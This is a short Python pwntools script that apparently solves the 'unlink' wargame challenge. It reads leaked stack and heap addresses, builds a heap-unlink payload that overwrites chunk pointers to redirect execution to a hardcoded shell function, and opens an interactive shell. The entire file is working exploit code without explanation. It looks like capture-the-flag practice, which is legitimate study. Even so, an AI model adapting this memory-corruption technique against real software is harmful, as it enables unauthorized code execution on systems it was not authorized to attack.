import sys
import struct
import os
from pwn import *

context.terminal = "./unlink"

unlink = process("/home/unlink/unlink")
stack_leak = int(unlink.recvline().split()[5], 16)
heap_leak = int(unlink.recvline().split()[5], 16)
unlink.recvline()

ebp_plus_2c = p32(stack_leak + 0x10)
bBuf_plus_8 = p32(heap_leak + 0x28)
shell_addr = p32(0x080484eb)
padding = "AAAABBBBCCCCDDDD"

exploit = padding + bBuf_plus_8 + ebp_plus_2c + "AAAA" + shell_addr

print "Exploit length: " + str(len(exploit))
print "B->buf + 0x8: " + hex(heap_leak + 0x28)
print "ebp + 0x2c: " + hex(stack_leak + 0x2c)

unlink.sendline(exploit)
unlink.interactive()
